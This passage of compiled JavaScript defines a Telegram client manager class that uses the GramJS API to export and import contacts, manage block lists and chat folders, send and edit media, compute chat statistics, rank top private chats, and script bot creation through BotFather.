                        totalPages: typeHasMore ? -1 : 1,
                        hasMore: typeHasMore,
                        nextMaxId: typeNextMaxId,
                        firstMessageId: typeFirstMessageId,
                        lastMessageId: typeLastMessageId
                    }
                };
            });
            const totalItems = mediaData.length;
            const overallHasMore = messages.length === queryLimit && messages.length > 0;
            const overallFirstMessageId = mediaData.length > 0 ? mediaData[0].messageId : undefined;
            const overallLastMessageId = mediaData.length > 0 ? mediaData[mediaData.length - 1].messageId : undefined;
            const overallNextMaxId = overallHasMore ? overallLastMessageId : undefined;
            const overallPrevMaxId = maxId && mediaData.length > 0 ? overallFirstMessageId : undefined;
            return {
                groups,
                pagination: {
                    page: 1,
                    limit,
                    total: totalItems,
                    totalPages: overallHasMore ? -1 : 1,
                    hasMore: overallHasMore,
                    nextMaxId: overallNextMaxId,
                    prevMaxId: overallPrevMaxId,
                    firstMessageId: overallFirstMessageId,
                    lastMessageId: overallLastMessageId
                },
                filters: {
                    chatId,
                    types: ['all'],
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
        else {
            const total = mediaData.length;
            const hasMore = messages.length === queryLimit && messages.length > 0;
            const firstMessageId = mediaData.length > 0 ? mediaData[0].messageId : undefined;
            const lastMessageId = mediaData.length > 0 ? mediaData[mediaData.length - 1].messageId : undefined;
            const nextMaxId = hasMore ? lastMessageId : undefined;
            const prevMaxId = maxId && mediaData.length > 0 ? firstMessageId : undefined;
            return {
                data: mediaData,
                pagination: {
                    page: 1,
                    limit,
                    total,
                    totalPages: hasMore ? -1 : 1,
                    hasMore,
                    nextMaxId,
                    prevMaxId,
                    firstMessageId,
                    lastMessageId
                },
                filters: {
                    chatId,
                    types: typesToFetch,
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
    }
    async safeGetEntity(entityId) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            return await this.client.getEntity(entityId);
        }
        catch (error) {
            this.logger.info(this.phoneNumber, `Failed to get entity directly for ${entityId}, searching in dialogs...`);
            try {
                for await (const dialog of this.client.iterDialogs({})) {
                    const entity = dialog.entity;
                    const dialogId = entity.id.toString();
                    if (dialogId === entityId.toString()) {
                        return entity;
                    }
                    if (dialogId.startsWith('-100')) {
                        if (dialogId.substring(4) === entityId.toString()) {
                            return entity;
                        }
                    }
                    else {
                        if (`-100${dialogId}` === entityId.toString()) {
                            return entity;
                        }
                    }
                }
                this.logger.info(this.phoneNumber, `Entity ${entityId} not found in dialogs either`);
                return null;
            }
            catch (dialogError) {
                this.logger.error(this.phoneNumber, 'Error while searching dialogs:', dialogError);
                return null;
            }
        }
    }
    generateCSV(contacts) {
        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');
        const rows = contacts.map(contact => [
            contact.firstName,
            contact.lastName,
            contact.phone,
            contact.blocked
        ].join(','));
        return [header, ...rows].join('\n');
    }
    generateVCard(contacts) {
        return contacts.map(contact => {
            const vcard = [
                'BEGIN:VCARD',
                'VERSION:3.0',
                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),
                `TEL;TYPE=CELL:${contact.phone || ''}`,
                'END:VCARD'
            ];
            return vcard.join('\n');
        }).join('\n\n');
    }
    async exportContacts(format, includeBlocked = false) {
        if (!this.client)
            throw new Error('Client not initialized');
        const contactsResult = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];
        let blockedContacts;
        if (includeBlocked) {
            blockedContacts = await this.client.invoke(new telegram_1.Api.contacts.GetBlocked({
                offset: 0,
                limit: 100
            }));
        }
        if (format === 'csv') {
            const csvData = contacts.map((contact) => ({
                firstName: contact.firstName || '',
                lastName: contact.lastName || '',
                phone: contact.phone || '',
                blocked: blockedContacts ? blockedContacts.peers.some((p) => p.id.toString() === contact.id.toString()) : false
            }));
            return this.generateCSV(csvData);
        }
        else {
            return this.generateVCard(contacts);
        }
    }
    async importContacts(data) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = await Promise.all(data.map(async (contact) => {
            try {
                await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                    contacts: [new telegram_1.Api.InputPhoneContact({
                            clientId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000)),
                            phone: contact.phone,
                            firstName: contact.firstName,
                            lastName: contact.lastName || ''
                        })]
                }));
                return { success: true, phone: contact.phone };
            }
            catch (error) {
                return { success: false, phone: contact.phone, error: error.message };
            }
        }));
        return results;
    }
    async manageBlockList(userIds, block) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = await Promise.all(userIds.map(async (userId) => {
            try {
                if (block) {
                    await this.client.invoke(new telegram_1.Api.contacts.Block({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                else {
                    await this.client.invoke(new telegram_1.Api.contacts.Unblock({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                return { success: true, userId };
            }
            catch (error) {
                return { success: false, userId, error: error.message };
            }
        }));
        return results;
    }
    async getContactStatistics() {
        if (!this.client)
            throw new Error('Client not initialized');
        const contactsResult = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];
        const onlineContacts = contacts.filter((c) => c.status && 'wasOnline' in c.status);
        return {
            total: contacts.length,
            online: onlineContacts.length,
            withPhone: contacts.filter((c) => c.phone).length,
            mutual: contacts.filter((c) => c.mutual).length,
            lastWeekActive: onlineContacts.filter((c) => {
                const lastSeen = new Date(c.status.wasOnline * 1000);
                const weekAgo = new Date();
                weekAgo.setDate(weekAgo.getDate() - 7);
                return lastSeen > weekAgo;
            }).length
        };
    }
    async createChatFolder(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const folder = new telegram_1.Api.DialogFilter({
            id: Math.floor(Math.random() * 1000),
            title: new telegram_1.Api.TextWithEntities({
                text: options.name,
                entities: []
            }),
            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),
            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),
            pinnedPeers: [],
            contacts: options.includeContacts ?? true,
            nonContacts: options.includeNonContacts ?? true,
            groups: options.includeGroups ?? true,
            broadcasts: options.includeBroadcasts ?? true,
            bots: options.includeBots ?? true,
            excludeMuted: options.excludeMuted ?? false,
            excludeRead: options.excludeRead ?? false,
            excludeArchived: options.excludeArchived ?? false
        });
        await this.client.invoke(new telegram_1.Api.messages.UpdateDialogFilter({
            id: folder.id,
            filter: folder
        }));
        return {
            id: folder.id,
            name: options.name,
            options: {
                includeContacts: folder.contacts,
                includeNonContacts: folder.nonContacts,
                includeGroups: folder.groups,
                includeBroadcasts: folder.broadcasts,
                includeBots: folder.bots,
                excludeMuted: folder.excludeMuted,
                excludeRead: folder.excludeRead,
                excludeArchived: folder.excludeArchived
            }
        };
    }
    async getChatFolders() {
        if (!this.client)
            throw new Error('Client not initialized');
        const filters = await this.client.invoke(new telegram_1.Api.messages.GetDialogFilters());
        return (filters.filters || []).map((filter) => ({
            id: filter.id ?? 0,
            title: filter.title ?? '',
            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,
            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0
        }));
    }
    async sendMediaBatch(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const mediaFiles = await Promise.all(options.media.map(async (item) => {
            const buffer = await this.downloadFileFromUrl(item.url);
            const file = new uploads_1.CustomFile(item.fileName || `media.${this.getMediaExtension(item.type)}`, buffer.length, 'media', buffer);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });
            const inputMedia = item.type === 'photo' ?
                new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new telegram_1.Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(item.type),
                    attributes: this.getMediaAttributes(item)
                });
            return new telegram_1.Api.InputSingleMedia({
                media: inputMedia,
                message: item.caption || '',
                entities: []
            });
        }));
        return this.client.invoke(new telegram_1.Api.messages.SendMultiMedia({
            peer: options.chatId,
            multiMedia: mediaFiles,
            silent: options.silent,
            scheduleDate: options.scheduleDate
        }));
    }
    getMimeType(type) {
        switch (type) {
            case 'photo': return 'image/jpeg';
            case 'video': return 'video/mp4';
            case 'document': return 'application/octet-stream';
            default: return 'application/octet-stream';
        }
    }
    getMediaAttributes(item) {
        const attributes = [];
        if (item.fileName) {
            attributes.push(new telegram_1.Api.DocumentAttributeFilename({
                fileName: item.fileName
            }));
        }
        if (item.type === 'video') {
            attributes.push(new telegram_1.Api.DocumentAttributeVideo({
                duration: 0,
                w: 1280,
                h: 720,
                supportsStreaming: true
            }));
        }
        return attributes;
    }
    async editMessage(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        if (options.media) {
            const buffer = await this.downloadFileFromUrl(options.media.url);
            const file = new uploads_1.CustomFile(`media.${this.getMediaExtension(options.media.type)}`, buffer.length, 'media', buffer);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });
            const inputMedia = options.media.type === 'photo' ?
                new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new telegram_1.Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(options.media.type),
                    attributes: this.getMediaAttributes(options.media)
                });
            return this.client.invoke(new telegram_1.Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                media: inputMedia,
                message: options.text || ''
            }));
        }
        if (options.text) {
            return this.client.invoke(new telegram_1.Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                message: options.text
            }));
        }
        throw new Error('Either text or media must be provided');
    }
    async getChats(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const dialogs = [];
        const limit = options.limit || 100;
        let count = 0;
        for await (const dialog of this.client.iterDialogs({
            ...options,
            limit
        })) {
            dialogs.push(dialog);
            count++;
            if (count >= limit)
                break;
        }
        return Promise.all(dialogs.map(async (dialog) => {
            const entity = dialog.entity;
            return {
                id: entity.id.toString(),
                title: 'title' in entity ? entity.title : null,
                username: 'username' in entity ? entity.username : null,
                type: entity instanceof telegram_1.Api.User ? 'user' :
                    entity instanceof telegram_1.Api.Chat ? 'group' :
                        entity instanceof telegram_1.Api.Channel ? 'channel' : 'unknown',
                unreadCount: dialog.unreadCount,
                lastMessage: dialog.message ? {
                    id: dialog.message.id,
                    text: dialog.message.message,
                    date: new Date(dialog.message.date * 1000)
                } : null
            };
        }));
    }
    async updateChatSettings(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const chat = await this.client.getEntity(settings.chatId);
        const updates = [];
        if (settings.title) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.EditTitle({
                channel: chat,
                title: settings.title
            })));
        }
        if (settings.about) {
            updates.push(this.client.invoke(new telegram_1.Api.messages.EditChatAbout({
                peer: chat,
                about: settings.about
            })));
        }
        if (settings.photo) {
            const buffer = await this.downloadFileFromUrl(settings.photo);
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });
            updates.push(this.client.invoke(new telegram_1.Api.channels.EditPhoto({
                channel: chat,
                photo: new telegram_1.Api.InputChatUploadedPhoto({
                    file: file
                })
            })));
        }
        if (settings.slowMode !== undefined) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
                channel: chat,
                seconds: settings.slowMode
            })));
        }
        if (settings.linkedChat) {
            const linkedChannel = await this.client.getEntity(settings.linkedChat);
            updates.push(this.client.invoke(new telegram_1.Api.channels.SetDiscussionGroup({
                broadcast: chat,
                group: linkedChannel
            })));
        }
        if (settings.username) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.UpdateUsername({
                channel: chat,
                username: settings.username
            })));
        }
        await Promise.all(updates);
        return true;
    }
    async getMessageStats(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const now = options.fromDate || new Date();
        const startDate = new Date(now);
        switch (options.period) {
            case 'day':
                startDate.setDate(startDate.getDate() - 1);
                break;
            case 'week':
                startDate.setDate(startDate.getDate() - 7);
                break;
            case 'month':
                startDate.setMonth(startDate.getMonth() - 1);
                break;
        }
        const messages = await this.client.getMessages(options.chatId, {
            limit: 100,
            offsetDate: Math.floor(now.getTime() / 1000),
        });
        const stats = {
            total: messages.length,
            withMedia: 0,
            withLinks: 0,
            withForwards: 0,
            byHour: new Array(24).fill(0),
            byType: {
                text: 0,
                photo: 0,
                video: 0,
                document: 0,
                other: 0
            }
        };
        for (const msg of messages) {
            const hour = new Date(msg.date * 1000).getHours();
            stats.byHour[hour]++;
            if (msg.media) {
                stats.withMedia++;
                const mediaType = this.getMediaType(msg.media);
                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;
            }
            else if (msg.message) {
                if (msg.message.match(/https?:\/\/[^\s]+/)) {
                    stats.withLinks++;
                }
                stats.byType.text++;
            }
            if (msg.fwdFrom) {
                stats.withForwards++;
            }
        }
        return stats;
    }
    async getTopPrivateChats(limit = 10) {
        if (!this.client)
            throw new Error('Client not initialized');
        const clampedLimit = Math.max(1, Math.min(50, limit || 10));
        this.logger.info(this.phoneNumber, `Starting optimized getTopPrivateChats analysis with limit=${clampedLimit}...`);
        const startTime = Date.now();
        const now = Date.now();
        const nowSeconds = Math.floor(now / 1000);
        const weights = {
            videoCall: 2,
            incomingCall: 4,
            outgoingCall: 1,
            sharedVideo: 12,
            sharedPhoto: 10,
            textMessage: 1,
            unreadMessages: 1,
        };
        const ACTIVITY_WINDOWS = {
            recent: 7,
            active: 30,
            dormant: 90
        };
        this.logger.info(this.phoneNumber, 'Fetching initial metadata in parallel...');
        const [me, callLogs, dialogs] = await Promise.all([
            this.getMe().catch(() => null),
            this.getCallLogsInternal().catch(() => ({})),
            (async () => {
                const results = [];
                for await (const dialog of this.client.iterDialogs({ limit: 350 })) {
                    results.push(dialog);
                }
                return results;
            })()
        ]);
        if (!me)
            throw new Error('Failed to fetch self userInfo');
        const candidateChats = dialogs
            .filter(dialog => {
            if (!dialog.isUser || !(dialog.entity instanceof telegram_1.Api.User))
                return false;
            const user = dialog.entity;
            if (user.bot || user.fake)
                return false;
            const userId = user.id.toString();
            return userId !== "777000" && userId !== "42777";
        })
            .map(dialog => {
            const unreadScore = (dialog.unreadCount || 0) * 10;
            const pinnedScore = dialog.pinned ? 50 : 0;
            return {
                dialog,
                preliminaryScore: unreadScore + pinnedScore
            };
        });
        let selfChatData = null;
        try {
            const selfChatId = me.id.toString();
            const results = await this.analyzeChatEngagement('me', me, 100, callLogs[selfChatId], weights, now, ACTIVITY_WINDOWS);
            selfChatData = results;
            this.logger.info(this.phoneNumber, `Self chat processed - Score: ${selfChatData.interactionScore}`);
        }
        catch (e) {
            this.logger.warn(this.phoneNumber, 'Error processing self chat:', e);
        }
        const topCandidates = candidateChats.slice(0, clampedLimit * 4);
        this.logger.info(this.phoneNumber, `Analyzing top ${topCandidates.length} candidates in depth...`);
        const chatStats = [];
        const batchSize = 10;
        for (let i = 0; i < topCandidates.length; i += batchSize) {
            const batch = topCandidates.slice(i, i + batchSize);
            const batchResults = await Promise.all(batch.map(async (candidate) => {
                const user = candidate.dialog.entity;
                const chatId = user.id.toString();
                try {
                    return await this.analyzeChatEngagement(chatId, user, 100, callLogs[chatId], weights, now, ACTIVITY_WINDOWS, candidate.dialog);
                }
                catch (error) {
                    this.logger.warn(this.phoneNumber, `Error analyzing chat ${chatId}:`, error.message);
                    return null;
                }
            }));
            chatStats.push(...batchResults.filter(Boolean));
        }
        let topChats = chatStats
            .sort((a, b) => b.interactionScore - a.interactionScore)
            .slice(0, clampedLimit);
        if (selfChatData) {
            topChats = topChats.filter(chat => chat.chatId !== 'me' && chat.chatId !== me.id.toString());
            topChats.unshift(selfChatData);
            if (topChats.length > clampedLimit)
                topChats = topChats.slice(0, clampedLimit);
        }
        const totalTime = Date.now() - startTime;
        this.logger.info(this.phoneNumber, `getTopPrivateChats optimized completed in ${totalTime}ms. Found ${topChats.length} results.`);
        return topChats;
    }
    async analyzeChatEngagement(chatId, user, messageLimit, callStats, weights, now, windows, dialog) {
        const lastMessage = await this.client.getMessages(chatId, { limit: 1 });
        if ((lastMessage?.total ?? 0) < 10)
            return null;
        const [photosList, videosList, photosByUsList, videosByUsList] = await Promise.all([
            this.client.getMessages(chatId, { filter: new telegram_1.Api.InputMessagesFilterPhotos(), limit: 1 }).catch(() => []),
            this.client.getMessages(chatId, { filter: new telegram_1.Api.InputMessagesFilterVideo(), limit: 1 }).catch(() => []),
            this.client.getMessages(chatId, { filter: new telegram_1.Api.InputMessagesFilterPhotos(), limit: 1, fromUser: 'me' }).catch(() => []),
            this.client.getMessages(chatId, { filter: new telegram_1.Api.InputMessagesFilterVideo(), limit: 1, fromUser: 'me' }).catch(() => []),
        ]);
        const totalPhotos = photosList?.total ?? 0;
        const totalVideos = videosList?.total ?? 0;
        const photosByUs = photosByUsList?.total ?? 0;
        const videosByUs = videosByUsList?.total ?? 0;
        const mediaStats = {
            photos: totalPhotos,
            videos: totalVideos,
            photosByUs,
            photosByThem: Math.max(0, totalPhotos - photosByUs),
            videosByUs,
            videosByThem: Math.max(0, totalVideos - videosByUs)
        };
        const lastMessageDate = dialog?.message?.date ? dialog.message.date * 1000 : now;
        const daysSinceLastActivity = (now - lastMessageDate) / (1000 * 60 * 60 * 24);
        const cCalls = callStats
            ? { ...callStats, total: callStats.total ?? callStats.totalCalls ?? 0 }
            : { total: 0, incoming: 0, outgoing: 0, video: 0 };
        const baseScore = (cCalls.incoming * weights.incomingCall +
            cCalls.outgoing * weights.outgoingCall +
            cCalls.video * weights.videoCall +
            mediaStats.videos * weights.sharedVideo +
            mediaStats.photos * weights.sharedPhoto);
        const engagementLevel = baseScore > 0 ? 'active' : 'dormant';
        const totalActivity = Math.max(1, baseScore);
        const activityBreakdown = {
            videoCalls: Math.round((cCalls.video * weights.videoCall / totalActivity) * 100),
            audioCalls: Math.round(((cCalls.total - cCalls.video) * (weights.incomingCall || weights.outgoingCall) / totalActivity) * 100),
            mediaSharing: Math.round(((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto) / totalActivity) * 100),
            textMessages: lastMessage.total ?? 0
        };
        return {
            chatId: chatId === 'me' ? 'me' : user.id.toString(),
            username: user.username,
            firstName: user.firstName || (chatId === 'me' ? 'Saved Messages' : ''),
            lastName: user.lastName,
            totalMessages: lastMessage.total ?? 0,
            interactionScore: baseScore,
            engagementLevel,
            lastActivityDays: Math.round(daysSinceLastActivity * 10) / 10,
            calls: {
                total: cCalls.total || 0,
                incoming: { total: cCalls.incoming || 0, audio: Math.max(0, cCalls.incoming - cCalls.video) || 0, video: cCalls.video || 0 },
                outgoing: { total: cCalls.outgoing || 0, audio: cCalls.outgoing || 0, video: 0 }
            },
            media: mediaStats,
            activityBreakdown
        };
    }
    async createGroupOrChannel(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            this.logger.info(this.phoneNumber, 'Creating group or channel with options:', options);
            const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel(options));
            return result;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error creating group or channel:', error);
            throw new Error(`Failed to create group or channel: ${error.message}`);
        }
    }
    async createBot(options) {
        if (!this.client) {
            this.logger.error(this.phoneNumber, 'Bot creation failed: Client not initialized', {});
            throw new Error('Client not initialized');
        }
        const botFatherUsername = 'BotFather';
        this.logger.info(this.phoneNumber, `[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);
        try {
            this.logger.info(this.phoneNumber, '[BOT CREATION] Attempting to get entity for BotFather...');
            const entity = await this.client.getEntity(botFatherUsername);
            this.logger.info(this.phoneNumber, '[BOT CREATION] Successfully connected to BotFather');
            this.logger.info(this.phoneNumber, '[BOT CREATION] Sending /newbot command...');
            await this.client.sendMessage(entity, {
                message: '/newbot'
            });
            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after /newbot command...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            this.logger.info(this.phoneNumber, `[BOT CREATION] Sending bot name: "${options.name}"`);
            await this.client.sendMessage(entity, {
                message: options.name
            });
            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after sending name...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            let botUsername = options.username;
            if (!/_bot$/.test(botUsername)) {
                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
                let uniqueSuffix = '';
                for (let i = 0; i < 3; i++) {
                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;
                this.logger.info(this.phoneNumber, `[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
            }
            this.logger.info(this.phoneNumber, `[BOT CREATION] Sending bot username: "${botUsername}"`);
            await this.client.sendMessage(entity, {
                message: botUsername
            });
            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after sending username...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            this.logger.info(this.phoneNumber, '[BOT CREATION] Retrieving response from BotFather...');
            const messages = await this.client.getMessages(entity, {
                limit: 1
            });
            if (!messages || messages.length === 0) {
                this.logger.error(this.phoneNumber, '[BOT CREATION] No response received from BotFather', {});
                throw new Error('No response received from BotFather');
            }
            const lastMessage = messages[0].message;
            this.logger.info(this.phoneNumber, `[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);
            if (!lastMessage.toLowerCase().includes('use this token')) {
                this.logger.error(this.phoneNumber, `[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`, {});
                throw new Error(`Bot creation failed: ${lastMessage}`);
            }
            const tokenMatch = lastMessage.match(/(\d+:[A-Za-z0-9_-]+)/);
            if (!tokenMatch) {
                this.logger.error(this.phoneNumber, '[BOT CREATION] Could not extract bot token from BotFather response', {});
                throw new Error('Could not extract bot token from BotFather response');
            }
            const botToken = tokenMatch[0];
            this.logger.info(this.phoneNumber, `[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);
            if (options.description) {
                this.logger.info(this.phoneNumber, '[BOT CREATION] Setting bot description...');
                await this.client.sendMessage(entity, { message: '/setdescription' });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for description update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, '[BOT CREATION] Sending description text...');
                await this.client.sendMessage(entity, { message: options.description });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, '[BOT CREATION] Description set successfully');
            }
            if (options.aboutText) {
                this.logger.info(this.phoneNumber, '[BOT CREATION] Setting about text...');
                await this.client.sendMessage(entity, { message: '/setabouttext' });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for about text update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, '[BOT CREATION] Sending about text...');
                await this.client.sendMessage(entity, { message: options.aboutText });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, '[BOT CREATION] About text set successfully');
            }
            if (options.profilePhotoUrl) {
                this.logger.info(this.phoneNumber, `[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
                try {
                    this.logger.info(this.phoneNumber, '[BOT CREATION] Downloading profile photo...');
                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);
                    this.logger.info(this.phoneNumber, `[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);
                    this.logger.info(this.phoneNumber, '[BOT CREATION] Sending /setuserpic command...');
                    await this.client.sendMessage(entity, { message: '/setuserpic' });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
                    await this.client.sendMessage(entity, { message: `@${options.username}` });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    this.logger.info(this.phoneNumber, '[BOT CREATION] Uploading profile photo...');
                    await this.client.sendFile(entity, {
                        file: Buffer.from(photoBuffer),
                        caption: '',
                        forceDocument: false
                    });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    this.logger.info(this.phoneNumber, '[BOT CREATION] Profile photo set successfully');
                }
                catch (photoError) {
                    this.logger.error(this.phoneNumber, `[BOT CREATION] Failed to set profile photo: ${photoError.message}`, {});
                }
            }
            this.logger.info(this.phoneNumber, `[BOT CREATION] Bot creation completed successfully: @${options.username}`);
            return {
                botToken,
                username: botUsername
            };
        }
        catch (error) {
            this.logger.error(this.phoneNumber, `[BOT CREATION] Error during bot creation process: ${error.message}`, error);
            throw new Error(`Failed to create bot: ${error.message}`);
        }
    }
    createVCardContent(contacts) {
        let vCardContent = '';
        contacts.users.map((user) => {
            user = user;
            vCardContent += 'BEGIN:VCARD\n';
            vCardContent += 'VERSION:3.0\n';
            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\n`;
            vCardContent += `TEL;TYPE=CELL:${user.phone}\n`;
            vCardContent += 'END:VCARD\n';
        });
        return vCardContent;
    }
    async sendContactsFile(chatId, contacts, filename = 'contacts.vcf') {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const vCardContent = this.createVCardContent(contacts);
            const tempPath = `./contacts/${chatId}-${filename}`;
            if (!fs.existsSync('./contacts')) {
                fs.mkdirSync('./contacts', { recursive: true });
            }
            fs.writeFileSync(tempPath, vCardContent, 'utf8');
            try {
                const fileContent = fs.readFileSync(tempPath);
                const file = new uploads_1.CustomFile(filename, fs.statSync(tempPath).size, tempPath, fileContent);
                await this.client.sendFile(chatId, {
                    file,
                    caption: `Contacts file with ${contacts.users.length} contacts`,
                    forceDocument: true
                });
                this.logger.info(this.phoneNumber, `Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);
            }
            finally {
                if (fs.existsSync(tempPath)) {
                    fs.unlinkSync(tempPath);
                }
            }
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending contacts file:', error);
            throw error;
        }
    }
}
exports.default = TelegramManager;
//# sourceMappingURL=TelegramManager.js.map